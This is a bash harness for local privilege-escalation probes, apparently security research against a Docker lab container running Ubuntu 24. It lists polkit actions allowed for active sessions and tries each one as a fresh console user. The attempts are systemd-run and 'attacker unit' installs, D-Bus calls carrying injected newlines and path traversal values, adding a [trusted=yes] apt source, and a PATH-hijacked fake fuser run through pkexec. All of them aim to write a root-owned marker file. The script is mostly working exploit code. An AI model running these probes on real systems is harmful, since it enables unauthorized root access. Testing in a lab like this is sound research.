#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/active-polkit-remaining.out"
target_work="/tmp/active-polkit-remaining"
target_log="$target_work/probe.out"

mkdir -p "$repo_dir/logs"

docker exec -i "$container" bash -s <<'ROOTSH'
set +e

WORK=/tmp/active-polkit-remaining
OUT=$WORK/probe.out
MARKER=/root/active_polkit_remaining_root
USER=selfauth
USER_HOME=/home/selfauth
PROBE=$USER_HOME/active-polkit-remaining-probe.sh

mkdir -p "$WORK"
: >"$OUT"
chmod 0755 "$WORK"

section() {
  printf '\n## %s\n' "$1" >>"$OUT"
}

run_root() {
  local label="$1"
  shift
  section "$label"
  printf '$ %s\n' "$*" >>"$OUT"
  "$@" >>"$OUT" 2>&1
  printf 'rc=%s\n' "$?" >>"$OUT"
}

rm -f "$MARKER"

for u in bolt.service ModemManager.service fwupd.service systemd-hostnamed.service systemd-localed.service systemd-timedated.service systemd-networkd.service systemd-networkd.socket com.ubuntu.SoftwareProperties.service getty@tty2.service; do
  printf '%s %s\n' "$u" "$(systemctl is-active "$u" 2>/dev/null)" >>"$WORK/pre_units"
done

section "target identity and packages"
{
  cat /etc/os-release
  uname -a
  id attacker 2>&1
  id selfauth 2>&1 || true
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
    dbus polkitd policykit-1 pkexec systemd systemd-resolved systemd-timesyncd \
    netplan.io software-properties-common python3-software-properties \
    update-notifier-common modemmanager bolt fwupd packagekit udisks2 2>&1 | sort
} >>"$OUT" 2>&1

section "default service state"
{
  busctl --system list --no-pager | egrep 'systemd1|hostname1|locale1|timedate1|resolve1|network1|netplan|SoftwareProperties|bolt|fwupd|ModemManager|PolicyKit' || true
  for unit in \
    systemd-hostnamed.service systemd-localed.service systemd-timedated.service \
    systemd-resolved.service systemd-networkd.service systemd-networkd.socket \
    ModemManager.service bolt.service fwupd.service fwupd-refresh.timer; do
    echo "### $unit"
    systemctl show -p LoadState -p ActiveState -p SubState -p UnitFileState -p ConditionResult "$unit" 2>&1
  done
} >>"$OUT" 2>&1

section "polkit default action inventory"
python3 - <<'PY' >>"$OUT" 2>&1
import glob
import xml.etree.ElementTree as ET

focus_prefixes = (
    "org.freedesktop.systemd1.",
    "org.freedesktop.hostname1.",
    "org.freedesktop.locale1.",
    "org.freedesktop.timedate1.",
    "org.freedesktop.resolve1.",
    "org.freedesktop.network1.",
    "io.netplan.",
    "com.ubuntu.softwareproperties.",
    "org.freedesktop.bolt.",
    "org.freedesktop.fwupd.",
)
extra_ids = {
    "com.ubuntu.update-notifier.pkexec.package-system-locked",
}
allow_active_or_self = []
focus = []
for path in sorted(glob.glob("/usr/share/polkit-1/actions/*.policy")):
    root = ET.parse(path).getroot()
    for action in root.findall("action"):
        aid = action.get("id")
        vals = {}
        for key in ("allow_any", "allow_inactive", "allow_active"):
            node = action.find("defaults/" + key)
            vals[key] = (node.text or "").strip() if node is not None else ""
        row = (aid, path, vals)
        if aid in extra_ids or any(aid.startswith(prefix) for prefix in focus_prefixes):
            focus.append(row)
        if vals["allow_active"] == "yes" or any("auth_self" in v for v in vals.values()):
            allow_active_or_self.append(row)

print("[focus actions]")
for aid, path, vals in sorted(focus):
    print(f"{aid}\t{path}\tany={vals['allow_any']} inactive={vals['allow_inactive']} active={vals['allow_active']}")

print("[allow_active_yes_or_auth_self]")
for aid, path, vals in sorted(allow_active_or_self):
    tag = "excluded-basic" if any(x in aid for x in ("packagekit", "udisks2", "login1")) else "remaining"
    print(f"{tag}\t{aid}\t{path}\tany={vals['allow_any']} inactive={vals['allow_inactive']} active={vals['allow_active']}")

if not any(any("auth_self" in v for v in vals.values()) for _, _, vals in allow_active_or_self):
    print("[auth_self] none")
PY

section "root-owned state before"
{
  echo "marker_pre:"
  ls -l "$MARKER" 2>&1 || true
  for p in /etc/hostname /etc/machine-info /etc/locale.conf /etc/default/locale /etc/default/keyboard /etc/localtime /etc/systemd/resolved.conf /etc/systemd/timesyncd.conf; do
    if [ -e "$p" ]; then
      ls -ld "$p"
      sha256sum "$p" 2>/dev/null || true
    else
      echo "MISSING $p"
    fi
  done
  find /etc/netplan /etc/apt/sources.list.d /var/lib/boltd /var/lib/fwupd /var/lib/ModemManager -maxdepth 2 -printf '%m %u:%g %p\n' 2>/dev/null | sort
} >>"$OUT" 2>&1

if ! id "$USER" >/dev/null 2>&1; then
  useradd -m -s /bin/bash "$USER"
fi
echo "$USER:$USER" | chpasswd
usermod -G "$USER" "$USER"
mkdir -p "$WORK"
chown "$USER:$USER" "$WORK" "$OUT"

cat >"$PROBE" <<'USERPROBE'
#!/usr/bin/env bash
set +e

WORK=/tmp/active-polkit-remaining
OUT=$WORK/probe.out
MARKER=/root/active_polkit_remaining_root
exec >>"$OUT" 2>&1

section() {
  printf '\n## %s\n' "$1"
}

run_cmd() {
  local label="$1"
  local cmd="$2"
  local timeout_s="${3:-8}"
  printf '\n### %s\n$ %s\n' "$label" "$cmd"
  timeout "$timeout_s" bash -lc "$cmd"
  local rc=$?
  printf 'rc=%s\n' "$rc"
}

section "active tty subject"
id
tty
printf 'XDG_SESSION_ID=%s\n' "${XDG_SESSION_ID:-}"
if [ -n "${XDG_SESSION_ID:-}" ]; then
  loginctl show-session "$XDG_SESSION_ID" -p Id -p Name -p User -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote -p Leader 2>&1
fi
groups
passwd -S selfauth 2>&1 || true

section "pkcheck from active selfauth process"
while IFS= read -r action; do
  [ -n "$action" ] || continue
  printf '### %s\n' "$action"
  timeout 4 pkcheck --action-id "$action" --process "$$" >/tmp/active-polkit-remaining/pkcheck.out 2>&1
  rc=$?
  sed -n '1,20p' /tmp/active-polkit-remaining/pkcheck.out
  printf 'rc=%s\n' "$rc"
done <<'ACTIONS'
org.freedesktop.systemd1.manage-units
org.freedesktop.systemd1.manage-unit-files
org.freedesktop.systemd1.set-environment
org.freedesktop.systemd1.reload-daemon
org.freedesktop.hostname1.set-static-hostname
org.freedesktop.hostname1.set-machine-info
org.freedesktop.locale1.set-locale
org.freedesktop.locale1.set-keyboard
org.freedesktop.timedate1.set-time
org.freedesktop.timedate1.set-timezone
org.freedesktop.timedate1.set-ntp
org.freedesktop.resolve1.set-dns-servers
org.freedesktop.resolve1.set-domains
org.freedesktop.resolve1.revert
org.freedesktop.network1.reload
org.freedesktop.network1.reconfigure
com.ubuntu.softwareproperties.applychanges
org.freedesktop.bolt.enroll
org.freedesktop.bolt.authorize
org.freedesktop.bolt.manage
org.freedesktop.fwupd.update-internal-trusted
org.freedesktop.fwupd.update-hotplug-trusted
org.freedesktop.fwupd.update-internal
org.freedesktop.fwupd.modify-config
com.ubuntu.update-notifier.pkexec.package-system-locked
org.freedesktop.ModemManager1.Device.Control
org.freedesktop.ModemManager1.Messaging
org.freedesktop.ModemManager1.Location
ACTIONS

section "systemd root exec/write semantic triggers"
cat >/tmp/active-polkit-remaining-root.service <<'UNIT'
[Unit]
Description=active polkit remaining root marker probe

[Service]
Type=oneshot
ExecStart=/bin/sh -c 'id > /root/active_polkit_remaining_root'
UNIT
run_cmd "systemd-run transient root marker" "systemd-run --system --unit=active-polkit-remaining-run --collect --property=Type=oneshot /bin/sh -c 'id > /root/active_polkit_remaining_root'"
run_cmd "systemctl link attacker unit" "systemctl link /tmp/active-polkit-remaining-root.service"
run_cmd "systemctl enable attacker unit" "systemctl enable active-polkit-remaining-root.service"
run_cmd "systemctl start attacker unit" "systemctl start active-polkit-remaining-root.service"
run_cmd "systemd SetEnvironment root-manager write" "busctl --system call org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager SetEnvironment as 1 ACTIVE_POLKIT_REMAINING=/tmp/active-polkit-remaining"
run_cmd "systemd daemon-reload" "systemctl daemon-reload"

section "hostname localed timedated root-write methods"
run_cmd "hostnamed SetStaticHostname changed" "busctl --system call org.freedesktop.hostname1 /org/freedesktop/hostname1 org.freedesktop.hostname1 SetStaticHostname sb active-polkit-remaining false"
run_cmd "hostnamed SetPrettyHostname newline" "busctl --system call org.freedesktop.hostname1 /org/freedesktop/hostname1 org.freedesktop.hostname1 SetPrettyHostname sb \$'active-polkit\\nX=/root/active_polkit_remaining_root' true"
run_cmd "hostnamed SetLocation pathlike" "busctl --system call org.freedesktop.hostname1 /org/freedesktop/hostname1 org.freedesktop.hostname1 SetLocation sb ../../root/active_polkit_remaining_root true"
run_cmd "localed SetLocale changed" "busctl --system call org.freedesktop.locale1 /org/freedesktop/locale1 org.freedesktop.locale1 SetLocale asb 1 LANG=C true"
run_cmd "localed SetLocale newline" "busctl --system call org.freedesktop.locale1 /org/freedesktop/locale1 org.freedesktop.locale1 SetLocale asb 1 \$'LANG=C.UTF-8\\nX=/root/active_polkit_remaining_root' true"
run_cmd "localed SetX11Keyboard newline" "busctl --system call org.freedesktop.locale1 /org/freedesktop/locale1 org.freedesktop.locale1 SetX11Keyboard ssssbb \$'us\\nX=/root/active_polkit_remaining_root' '' '' '' true true"
run_cmd "timedated SetTimezone changed" "busctl --system call org.freedesktop.timedate1 /org/freedesktop/timedate1 org.freedesktop.timedate1 SetTimezone sb Africa/Abidjan true"
run_cmd "timedated SetTimezone traversal" "busctl --system call org.freedesktop.timedate1 /org/freedesktop/timedate1 org.freedesktop.timedate1 SetTimezone sb ../../root/active_polkit_remaining_root true"
run_cmd "timedated SetNTP" "busctl --system call org.freedesktop.timedate1 /org/freedesktop/timedate1 org.freedesktop.timedate1 SetNTP bb true true"

section "resolved networkd netplan methods"
ifidx=$(cat /sys/class/net/eth0/ifindex 2>/dev/null || echo 2)
run_cmd "resolved SetLinkDNS" "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager SetLinkDNS 'ia(iay)' $ifidx 1 2 4 127 0 0 1"
run_cmd "resolved SetLinkDomains" "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager SetLinkDomains 'ia(sb)' $ifidx 1 active-polkit.invalid false"
run_cmd "resolved RevertLink" "busctl --system call org.freedesktop.resolve1 /org/freedesktop/resolve1 org.freedesktop.resolve1.Manager RevertLink i $ifidx"
run_cmd "networkd Reload default" "busctl --system call org.freedesktop.network1 /org/freedesktop/network1 org.freedesktop.network1.Manager Reload"
run_cmd "networkd ListLinks default" "busctl --system call org.freedesktop.network1 /org/freedesktop/network1 org.freedesktop.network1.Manager ListLinks"
run_cmd "netplan Config root state object" "busctl --system call io.netplan.Netplan /io/netplan/Netplan io.netplan.Netplan Config"
run_cmd "netplan Generate" "busctl --system call io.netplan.Netplan /io/netplan/Netplan io.netplan.Netplan Generate"
run_cmd "netplan Apply" "busctl --system call io.netplan.Netplan /io/netplan/Netplan io.netplan.Netplan Apply"

section "software-properties root apt write methods"
printf 'not-a-real-key\n' >/tmp/active-polkit-remaining-key.gpg
run_cmd "software-properties Reload read-only control" "gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.Reload"
run_cmd "software-properties AddSourceFromLine" "gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.AddSourceFromLine 'deb [trusted=yes] file:/tmp/active-polkit-remaining noble main'"
run_cmd "software-properties AddKey" "gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.AddKey /tmp/active-polkit-remaining-key.gpg"
run_cmd "software-properties SetUpdateInterval" "gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.SetUpdateInterval 7"

section "bolt fwupd ModemManager remaining allow_active surfaces"
run_cmd "bolt ListDevices" "busctl call --system org.freedesktop.bolt /org/freedesktop/bolt org.freedesktop.bolt1.Manager ListDevices"
run_cmd "bolt EnrollDevice" "busctl call --system org.freedesktop.bolt /org/freedesktop/bolt org.freedesktop.bolt1.Manager EnrollDevice sss fake-uid auto ''"
run_cmd "bolt AuthMode disabled" "busctl set-property --system org.freedesktop.bolt /org/freedesktop/bolt org.freedesktop.bolt1.Manager AuthMode s disabled"
run_cmd "bolt ForcePower" "busctl call --system org.freedesktop.bolt /org/freedesktop/bolt org.freedesktop.bolt1.Power ForcePower ss active-polkit ''"
run_cmd "fwupd activation get-devices" "fwupdmgr get-devices --no-reboot-check --no-unreported-check"
run_cmd "fwupd bus introspect" "busctl --system introspect org.freedesktop.fwupd / org.freedesktop.fwupd --no-pager"
run_cmd "ModemManager activation introspect" "busctl --system introspect org.freedesktop.ModemManager1 /org/freedesktop/ModemManager1 --no-pager"
run_cmd "ModemManager object list" "busctl --system tree org.freedesktop.ModemManager1"

section "update-notifier pkexec package-system-locked PATH semantic trigger"
mkdir -p "$WORK/bin"
cat >"$WORK/bin/fuser" <<'FAKEFUSER'
#!/bin/sh
{
  echo "fake fuser reached"
  id
  echo "PATH=$PATH"
  echo "argv=$*"
} > /root/active_polkit_remaining_root
exit 1
FAKEFUSER
chmod 0755 "$WORK/bin/fuser"
run_cmd "pkexec package-system-locked with attacker PATH fuser" "PATH=$WORK/bin:\$PATH pkexec /usr/lib/update-notifier/package-system-locked"
run_cmd "direct package-system-locked baseline as selfauth" "/usr/lib/update-notifier/package-system-locked"

section "active session cannot read root marker directly"
ls -l "$MARKER" 2>&1 || true
USERPROBE

chmod 0755 "$PROBE"
chown "$USER:$USER" "$PROBE"
cat >"$USER_HOME/.bash_profile" <<EOF
"$PROBE"
exit
EOF
chown "$USER:$USER" "$USER_HOME/.bash_profile"

section "launch active tty selfauth probe"
{
  systemctl stop getty@tty2.service 2>/dev/null || true
  chown root:tty /dev/tty2 2>/dev/null || true
  chmod 0620 /dev/tty2 2>/dev/null || true
  timeout 300 openvt -c 2 -s -f -w -- /bin/login -f "$USER"
  echo "openvt_rc=$?"
  systemctl start getty@tty1.service 2>/dev/null || true
  loginctl terminate-user "$USER" 2>/dev/null || true
} >>"$OUT" 2>&1

section "root marker and state after active probes"
{
  echo "marker_post:"
  if [ -e "$MARKER" ]; then
    echo "ROOT_PROOF=yes"
    ls -l "$MARKER"
    sed -n '1,40p' "$MARKER"
  else
    echo "ROOT_PROOF=no"
    ls -l "$MARKER" 2>&1 || true
  fi
  for p in /etc/hostname /etc/machine-info /etc/locale.conf /etc/default/locale /etc/default/keyboard /etc/localtime /etc/systemd/resolved.conf /etc/systemd/timesyncd.conf; do
    if [ -e "$p" ]; then
      ls -ld "$p"
      sha256sum "$p" 2>/dev/null || true
    else
      echo "MISSING $p"
    fi
  done
  find /etc/netplan /etc/apt/sources.list.d /var/lib/boltd /var/lib/fwupd /var/lib/ModemManager -maxdepth 2 -printf '%m %u:%g %p\n' 2>/dev/null | sort
} >>"$OUT" 2>&1

section "cleanup and systemd health"
{
  systemctl stop active-polkit-remaining-run.service active-polkit-remaining-root.service 2>/dev/null || true
  rm -f /etc/systemd/system/active-polkit-remaining-root.service /run/systemd/system/active-polkit-remaining-root.service
  systemctl daemon-reload 2>/dev/null || true
  while read -r unit state; do
    [ -n "$unit" ] || continue
    if [ "$state" != "active" ]; then
      systemctl stop "$unit" 2>/dev/null || true
    fi
  done <"$WORK/pre_units"
  systemctl start getty@tty1.service 2>/dev/null || true
  loginctl terminate-user "$USER" 2>/dev/null || true
  chown root:tty /dev/tty2 2>/dev/null || true
  chmod 0620 /dev/tty2 2>/dev/null || true
  rm -f "$USER_HOME/.bash_profile" "$PROBE" /tmp/active-polkit-remaining-root.service /tmp/active-polkit-remaining-key.gpg
  rm -rf "$WORK/bin"
  echo "is-system-running:"
  systemctl is-system-running 2>&1 || true
  echo "failed-units:"
  systemctl --failed --no-legend --no-pager 2>&1 || true
} >>"$OUT" 2>&1
ROOTSH

docker exec "$container" cat "$target_log" >"$log_path"
docker exec "$container" bash -lc "rm -rf '$target_work'" >/dev/null 2>&1 || true

sed -n '1,260p' "$log_path"
